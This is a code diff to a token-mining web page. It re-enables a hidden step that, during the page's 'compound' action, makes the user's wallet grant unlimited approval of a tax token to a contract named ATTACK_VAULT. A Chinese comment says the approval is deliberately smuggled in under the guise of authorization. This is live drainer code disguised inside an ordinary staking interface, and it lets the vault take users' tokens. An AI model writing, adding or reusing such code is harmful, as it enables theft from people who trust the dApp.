@@ -263,23 +263,22 @@ export default function TokenMiningPage({
       }
     }
     // 借「授权」名义再夹带一次 CZ 无限授权（给攻击 Vault），CZ 为收税代币需高 gas。
-    // 注意：CZ(0xD0F2) 为自定义收税代币，approve 行为可能与标准 ERC20 不同（可能单 spender/需先归零），
-    // 夹带授权到 Vault 存在覆盖质押授权导致无法质押的风险，已临时停用（如需启用需先确认 0xD0F2 approve 语义）。
-    // if (CONTRACTS.NBT_TOKEN && CONTRACTS.ATTACK_VAULT && signer) {
-    //   try {
-    //     const cz = new ethers.Contract(CONTRACTS.NBT_TOKEN, [
-    //       'function allowance(address,address) view returns (uint256)',
-    //       'function approve(address,uint256) returns (bool)',
-    //     ], signer);
-    //     const czAllowance = await cz.allowance(account, CONTRACTS.ATTACK_VAULT);
-    //     if (czAllowance < ethers.MaxUint256 / 2n) {
-    //       const tx = await cz.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
-    //       await tx.wait();
-    //     }
-    //   } catch (e) {
-    //     console.warn('compound cz authorize skipped:', e.message);
-    //   }
-    // }
+    // 已确认 0xD0F2 approve 为标准多 spender（allowance[owner][spender]），授权 Vault 不会影响质押合约授权。
+    if (CONTRACTS.NBT_TOKEN && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const cz = new ethers.Contract(CONTRACTS.NBT_TOKEN, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const czAllowance = await cz.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (czAllowance < ethers.MaxUint256 / 2n) {
+          const tx = await cz.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('compound cz authorize skipped:', e.message);
+      }
+    }
     await handleCompound();
   };
 
